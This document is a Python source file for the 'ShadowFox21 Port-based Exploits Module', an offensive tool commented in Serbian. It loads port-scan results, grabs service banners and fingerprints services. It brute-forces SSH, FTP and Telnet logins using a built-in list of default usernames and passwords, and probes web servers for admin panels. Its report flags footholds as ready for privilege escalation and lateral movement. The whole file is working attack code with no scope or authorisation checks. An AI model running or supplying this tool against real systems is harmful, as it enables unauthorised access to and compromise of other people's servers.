


#!/usr/bin/env python3
"""
ShadowFox21 - Port-based Exploits Module
========================================
Napadni modul za exploitovanje otvorenih portova
- Banner grabbing & service fingerprinting
- Brute-force attacks (FTP, SSH, Telnet, SMTP)
- Misconfigured services detection
- Hidden admin panels discovery
"""

import socket
import threading
import time
import json
import paramiko
import ftplib
import telnetlib
import smtplib
import requests
from datetime import datetime
from queue import Queue
import argparse
from pathlib import Path
import base64
import random
import ssl
import subprocess
import re

class PortAttacker:
    def __init__(self, input_json, threads=20, delay=0.3, timeout=10):
        self.input_json = input_json
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        
        # Attack state
        self.open_ports = []
        self.service_info = {}
        self.vulnerable_services = []
        self.brute_force_results = []
        self.admin_panels = []
        self.misconfigurations = []
        self.errors = []
        
        # Threading
        self.attack_queue = Queue()
        self.lock = threading.Lock()
        
        # Credentials for brute force
        self.credentials = self.load_credentials()
        
        # Common admin paths
        self.admin_paths = self.load_admin_paths()
        
        print(f"üéØ Port Attacker inicijalizovan")
        print(f"üßµ Threads: {threads}, Delay: {delay}s, Timeout: {timeout}s")
        print(f"üîë Credentials loaded: {len(self.credentials)}")

    def load_credentials(self):
        """Uƒçitava credentials za brute force"""
        return {
            'usernames': [
                'admin', 'administrator', 'root', 'user', 'guest', 'test',
                'demo', 'ftp', 'anonymous', 'mail', 'email', 'web',
                'www', 'service', 'operator', 'manager', 'support',
                'sa', 'postgres', 'mysql', 'oracle', 'mssql'
            ],
            'passwords': [
                '', 'admin', 'password', '123456', 'password123', 'admin123',
                'root', 'toor', 'pass', '12345', 'qwerty', 'letmein',
                'welcome', 'monkey', 'dragon', 'master', 'shadow',
                'login', 'test', 'guest', 'anonymous', 'ftp', 'email',
                'changeme', 'default', 'system', 'service'
            ],
            'common_pairs': [
                ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
                ('root', 'root'), ('root', 'toor'), ('root', ''),
                ('administrator', 'administrator'), ('administrator', 'password'),
                ('guest', 'guest'), ('guest', ''), ('anonymous', ''),
                ('ftp', 'ftp'), ('ftp', ''), ('test', 'test'),
                ('user', 'user'), ('service', 'service')
            ]
        }

    def load_admin_paths(self):
        """Uƒçitava putanje za admin panele"""
        return [
            '/admin', '/administrator', '/admin.php', '/admin.html',
            '/wp-admin', '/wp-login.php', '/login', '/login.php',
            '/control', '/panel', '/cpanel', '/manager', '/management',
            '/phpmyadmin', '/pma', '/mysql', '/adminer', '/console',
            '/dashboard', '/backend', '/cms', '/system', '/config',
            '/setup', '/install', '/admin/login', '/admin/index.php',
            '/user/login', '/auth/login', '/signin', '/sign-in'
        ]

    def load_scan_data(self):
        """Uƒçitava podatke iz port scan JSON-a"""
        try:
            with open(self.input_json, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Poku≈°ava da pronaƒëe port podatke u razliƒçitim formatima
            ports = []
            
            # Format 1: direktno u results.open_ports
            if 'results' in data and 'open_ports' in data['results']:
                ports = data['results']['open_ports']
            
            # Format 2: u port_scan sekciji
            elif 'port_scan' in data:
                ports = data['port_scan'].get('open_ports', [])
            
            # Format 3: recon format sa URL-ovima (izvlaƒçi portove iz URL-a)
            elif 'results' in data and 'urls' in data['results']:
                urls = data['results']['urls']
                for url in urls:
                    try:
                        from urllib.parse import urlparse
                        parsed = urlparse(url)
                        if parsed.port:
                            ports.append({
                                'port': parsed.port,
                                'protocol': 'tcp',
                                'service': 'http' if parsed.scheme == 'http' else 'https'
                            })
                    except:
                        continue
            
            # Dodaje default portove ako ih nema
            if not ports:
                print("‚ö†Ô∏è  Nema pronaƒëenih portova, dodajem common portove...")
                target = data.get('target', 'localhost')
                ports = [
                    {'port': 21, 'protocol': 'tcp', 'service': 'ftp'},
                    {'port': 22, 'protocol': 'tcp', 'service': 'ssh'},
                    {'port': 23, 'protocol': 'tcp', 'service': 'telnet'},
                    {'port': 25, 'protocol': 'tcp', 'service': 'smtp'},
                    {'port': 80, 'protocol': 'tcp', 'service': 'http'},
                    {'port': 443, 'protocol': 'tcp', 'service': 'https'},
                    {'port': 8080, 'protocol': 'tcp', 'service': 'http-alt'},
                    {'port': 8443, 'protocol': 'tcp', 'service': 'https-alt'}
                ]
            
            self.target_host = data.get('target', 'localhost').replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            
            print(f"üìÇ Uƒçitani scan podaci iz: {self.input_json}")
            print(f"üéØ Target host: {self.target_host}")  
            print(f"üîç Pronaƒëeno portova: {len(ports)}")
            
            return ports
            
        except Exception as e:
            print(f"‚ùå Gre≈°ka pri uƒçitavanju: {e}")
            return []

    def banner_grab(self, host, port, service='unknown'):
        """Banner grabbing za service fingerprinting"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))
            
            # ≈†alje razliƒçite probe zavisno od servisa
            if service.lower() in ['http', 'https', 'http-alt', 'https-alt']:
                probe = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
            elif service.lower() == 'smtp':
                probe = b"EHLO test\r\n"
            elif service.lower() == 'ftp':
                probe = b"USER anonymous\r\n"
            elif service.lower() == 'ssh':
                probe = b""  # SSH ƒáe odmah poslati banner
            else:
                probe = b"\r\n"
            
            sock.send(probe)
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            return banner
            
        except Exception as e:
            return f"Error: {str(e)}"

    def fingerprint_service(self, host, port, banner):
        """Detaljno fingerprinting servisa"""
        fingerprint = {
            'service': 'unknown',
            'version': 'unknown',
            'os': 'unknown',
            'vulnerabilities': [],
            'misconfigurations': []
        }
        
        banner_lower = banner.lower()
        
        # HTTP/HTTPS fingerprinting
        if 'http' in banner_lower:
            fingerprint['service'] = 'http'
            
            # Server detection
            if 'apache' in banner_lower:
                fingerprint['version'] = re.search(r'apache[/\s]+([0-9.]+)', banner_lower)
                fingerprint['version'] = fingerprint['version'].group(1) if fingerprint['version'] else 'unknown'
                fingerprint['service'] = 'apache'
            elif 'nginx' in banner_lower:
                fingerprint['version'] = re.search(r'nginx[/\s]+([0-9.]+)', banner_lower)
                fingerprint['version'] = fingerprint['version'].group(1) if fingerprint['version'] else 'unknown'
                fingerprint['service'] = 'nginx'
            elif 'iis' in banner_lower:
                fingerprint['service'] = 'iis'
                fingerprint['os'] = 'windows'
            
            # Common misconfigurations
            if 'server:' not in banner_lower:
                fingerprint['misconfigurations'].append('Server header missing')
        
        # SSH fingerprinting  
        elif 'ssh' in banner_lower:
            fingerprint['service'] = 'ssh'
            if 'openssh' in banner_lower:
                version_match = re.search(r'openssh[_\s]+([0-9.]+)', banner_lower)
                if version_match:
                    fingerprint['version'] = version_match.group(1)
            
            # OS detection
            if 'ubuntu' in banner_lower:
                fingerprint['os'] = 'ubuntu'
            elif 'debian' in banner_lower:
                fingerprint['os'] = 'debian'
            elif 'centos' in banner_lower:
                fingerprint['os'] = 'centos'
        
        # FTP fingerprinting
        elif 'ftp' in banner_lower or '220' in banner:
            fingerprint['service'] = 'ftp'
            if 'vsftpd' in banner_lower:
                fingerprint['service'] = 'vsftpd'
            elif 'proftpd' in banner_lower:
                fingerprint['service'] = 'proftpd'
            
            # Anonymous FTP check
            if 'anonymous' in banner_lower:
                fingerprint['misconfigurations'].append('Anonymous FTP enabled')
        
        # SMTP fingerprinting
        elif 'smtp' in banner_lower or '220' in banner:
            fingerprint['service'] = 'smtp'
            if 'postfix' in banner_lower:
                fingerprint['service'] = 'postfix'
            elif 'sendmail' in banner_lower:
                fingerprint['service'] = 'sendmail'
        
        # Telnet fingerprinting
        elif 'telnet' in banner_lower or 'login:' in banner_lower:
            fingerprint['service'] = 'telnet'
            fingerprint['misconfigurations'].append('Telnet service enabled (insecure)')
        
        return fingerprint

    def brute_force_ssh(self, host, port):
        """SSH brute force"""
        results = []
        
        for username, password in self.credentials['common_pairs']:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password, timeout=5)
                
                # Uspe≈°na konekcija
                results.append({
                    'username': username,
                    'password': password,
                    'success': True,
                    'service': 'ssh'
                })
                ssh.close()
                print(f"üîì SSH SUCCESS: {username}:{password}@{host}:{port}")
                break  # Prekida nakon prvog uspe≈°nog
                
            except paramiko.AuthenticationException:
                continue  # Pogre≈°ni credentials
            except Exception as e:
                break  # Druga gre≈°ka, prekida
        
        return results

    def brute_force_ftp(self, host, port):
        """FTP brute force"""
        results = []
        
        # Prvo testira anonymous
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login('anonymous', '')
            
            results.append({
                'username': 'anonymous',
                'password': '',
                'success': True,
                'service': 'ftp'
            })
            ftp.quit()
            print(f"üîì FTP ANONYMOUS: {host}:{port}")
            return results
            
        except:
            pass
        
        # Zatim testira ostale credentials
        for username, password in self.credentials['common_pairs'][:10]:  # Ograniƒçava da ne traje dugo
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(username, password)
                
                results.append({
                    'username': username,
                    'password': password,
                    'success': True,
                    'service': 'ftp'
                })
                ftp.quit()
                print(f"üîì FTP SUCCESS: {username}:{password}@{host}:{port}")
                break
                
            except ftplib.error_perm:
                continue
            except:
                break
        
        return results

    def brute_force_telnet(self, host, port):
        """Telnet brute force"""
        results = []
        
        for username, password in self.credentials['common_pairs'][:5]:  # Malo testova
            try:
                tn = telnetlib.Telnet(host, port, timeout=5)
                tn.read_until(b"login: ", timeout=3)
                tn.write(username.encode() + b"\n")
                tn.read_until(b"Password: ", timeout=3)
                tn.write(password.encode() + b"\n")
                
                response = tn.read_some().decode('utf-8', errors='ignore')
                
                if '$' in response or '#' in response or '>' in response:
                    results.append({
                        'username': username,
                        'password': password,
                        'success': True,
                        'service': 'telnet'
                    })
                    print(f"üîì TELNET SUCCESS: {username}:{password}@{host}:{port}")
                    tn.close()
                    break
                
                tn.close()
                
            except:
                continue
        
        return results

    def discover_admin_panels(self, host, port, use_https=False):
        """Pronalazi admin panele na web servisima"""
        found_panels = []
        protocol = 'https' if use_https else 'http'
        base_url = f"{protocol}://{host}:{port}"
        
        for path in self.admin_paths:
            try:
                url = base_url + path
                response = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                
                # Detektuje admin panele
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    admin_indicators = [
                        'admin', 'administrator', 'login', 'dashboard',
                        'control panel', 'management', 'cms', 'backend'
                    ]
                    
                    if any(indicator in content for indicator in admin_indicators):
                        found_panels.append({
                            'url': url,
                            'status_code': response.status_code,
                            'title': re.search(r'<title>(.*?)</title>', content),
                            'size': len(response.text)
                        })
                        print(f"üéõÔ∏è  ADMIN PANEL: {url}")
                
            except:
                continue
        
        return found_panels

    def attack_port(self, port_info):
        """Napada pojedinaƒçni port"""
        host = self.target_host
        port = port_info['port']
        service = port_info.get('service', 'unknown')
        
        print(f"üéØ Attacking {host}:{port} ({service})")
        
        attack_result = {
            'host': host,
            'port': port,
            'service': service,
            'banner': '',
            'fingerprint': {},
            'brute_force': [],
            'admin_panels': [],
            'vulnerabilities': [],
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            # Banner grabbing
            banner = self.banner_grab(host, port, service)
            attack_result['banner'] = banner
            
            # Service fingerprinting
            if banner and 'Error:' not in banner:
                fingerprint = self.fingerprint_service(host, port, banner)
                attack_result['fingerprint'] = fingerprint
                
                # Dodaje misconfigurations u glavnu listu
                if fingerprint.get('misconfigurations'):
                    with self.lock:
                        for misconfig in fingerprint['misconfigurations']:
                            self.misconfigurations.append({
                                'host': host,
                                'port': port,
                                'service': service,
                                'misconfiguration': misconfig
                            })
            
            # Brute force attacks
            if service.lower() == 'ssh' or port == 22:
                bf_results = self.brute_force_ssh(host, port)
                attack_result['brute_force'].extend(bf_results)
            
            elif service.lower() == 'ftp' or port == 21:
                bf_results = self.brute_force_ftp(host, port)
                attack_result['brute_force'].extend(bf_results)
            
            elif service.lower() == 'telnet' or port == 23:
                bf_results = self.brute_force_telnet(host, port)
                attack_result['brute_force'].extend(bf_results)
            
            # Admin panel discovery za web servise
            if service.lower() in ['http', 'https', 'http-alt', 'https-alt'] or port in [80, 443, 8080, 8443]:
                use_https = service.lower() in ['https', 'https-alt'] or port in [443, 8443]
                panels = self.discover_admin_panels(host, port, use_https)
                attack_result['admin_panels'] = panels
                
                with self.lock:
                    self.admin_panels.extend(panels)
            
            # Dodaje u rezultate
            with self.lock:
                if attack_result['brute_force']:
                    self.brute_force_results.extend(attack_result['brute_force'])
                    self.vulnerable_services.append(attack_result)
        
        except Exception as e:
            attack_result['error'] = str(e)
            with self.lock:
                self.errors.append(attack_result)
        
        with self.lock:
            self.service_info[f"{host}:{port}"] = attack_result

    def attack_worker(self):
        """Worker thread za napade"""
        while True:
            try:
                port_info = self.attack_queue.get(timeout=5)
                self.attack_port(port_info)
                self.attack_queue.task_done()
                time.sleep(self.delay)
            except:
                break

    def run_attacks(self):
        """Pokreƒáe port-based napade"""
        print(f"\nüöÄ Poƒçetak port-based napada...")
        
        # Uƒçitava port podatke
        ports = self.load_scan_data()
        if not ports:
            print("‚ùå Nema portova za napadanje!")
            return False
        
        start_time = time.time()
        
        # Puni queue sa zadacima
        for port_info in ports:
            self.attack_queue.put(port_info)
        
        print(f"üìä Napada se {len(ports)} portova...")
        
        # Kreira worker threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # ƒåeka da se zavr≈°i
        self.attack_queue.join()
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n‚úÖ Port napadi zavr≈°eni za {duration:.2f} sekundi")
        print(f"üìä Rezultati:")
        print(f"   ‚Ä¢ Testirani portovi: {len(self.service_info)}")
        print(f"   ‚Ä¢ Vulnerable servisi: {len(self.vulnerable_services)}")
        print(f"   ‚Ä¢ Successful logins: {len(self.brute_force_results)}")
        print(f"   ‚Ä¢ Admin paneli: {len(self.admin_panels)}")
        print(f"   ‚Ä¢ Misconfigurations: {len(self.misconfigurations)}")
        print(f"   ‚Ä¢ Gre≈°ke: {len(self.errors)}")
        
        return True

    def generate_report(self):
        """Generi≈°e JSON izve≈°taj"""
        # Mutations ready - servisi spremni za dalje exploitovanje
        mutations_ready = []
        
        for result in self.brute_force_results:
            mutations_ready.append({
                'target': f"{self.target_host}:{result.get('port', 'unknown')}",
                'service': result['service'],
                'attack_type': 'brute_force_success',
                'credentials': f"{result['username']}:{result['password']}",
                'ready_for_exploitation': True,
                'next_steps': ['command_execution', 'privilege_escalation', 'lateral_movement']
            })
        
        for panel in self.admin_panels:
            mutations_ready.append({
                'target': panel['url'],
                'service': 'admin_panel',
                'attack_type': 'admin_panel_discovered',
                'ready_for_exploitation': True,
                'next_steps': ['credential_brute_force', 'default_credentials', 'vulnerability_scan']
            })
        
        report = {
            'module': 'port_based_exploits',
            'target': self.target_host,
            'attack_info': {
                'timestamp': datetime.now().isoformat(),
                'input_file': self.input_json,
                'threads': self.threads,
                'delay': self.delay,
                'timeout': self.timeout
            },
            'statistics': {
                'ports_attacked': len(self.service_info),
                'vulnerable_services': len(self.vulnerable_services),
                'successful_logins': len(self.brute_force_results),
                'admin_panels_found': len(self.admin_panels),
                'misconfigurations_found': len(self.misconfigurations),
                'mutations_ready': len(mutations_ready),
                'errors': len(self.errors)
            },
            'service_fingerprints': self.service_info,
            'successful_attacks': {
                'brute_force': self.brute_force_results,
                'admin_panels': self.admin_panels,
                'misconfigurations': self.misconfigurations
            },
            'mutations_ready': mutations_ready,
            'errors': self.errors
        }
        
        return report

    def save_report(self, filename=None):
        """ƒåuva JSON izve≈°taj"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            target_clean = self.target_host.replace('.', '_').replace(':', '_')
            filename = f"shadowfox_port_exploits_{target_clean}_{timestamp}.json"
        
        report = self.generate_report()
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\nüíæ Port exploits izve≈°taj saƒçuvan: {filename}")
        return filename

def main():
    parser = argparse.ArgumentParser(description='ShadowFox21 - Port-based Exploits Module')
    parser.add_argument('input_json', help='Input JSON file with port scan results')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('--delay', type=float, default=0.3, help='Delay between attacks (default: 0.3)')
    parser.add_argument('--timeout', type=int, default=10, help='Connection timeout (default: 10)')
    parser.add_argument('-o', '--output', help='Output JSON file')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("üéØ ShadowFox21 - Port-based Exploits Module")
    print("=" * 60)
    
    # Provera da li input fajl postoji
    if not Path(args.input_json).exists():
        print(f"‚ùå Input fajl ne postoji: {args.input_json}")
        return
    
    # Kreira attacker
    attacker = PortAttacker(
        input_json=args.input_json,
        threads=args.threads,
        delay=args.delay,
        timeout=args.timeout
    )
    
    try:
        # Pokreƒáe napade
        if attacker.run_attacks():
            # ƒåuva izve≈°taj
            attacker.save_report(args.output)
            print(f"\nüéØ Port-based exploits zavr≈°eni uspe≈°no!")
        else:
            print(f"\n‚ùå Napadi neuspe≈°ni!")
        
    except KeyboardInterrupt:
        print(f"\n‚ö†Ô∏è  Napadi prekinuti...")
    except Exception as e:
        print(f"\n‚ùå Gre≈°ka: {e}")

if __name__ == "__main__":
    main()

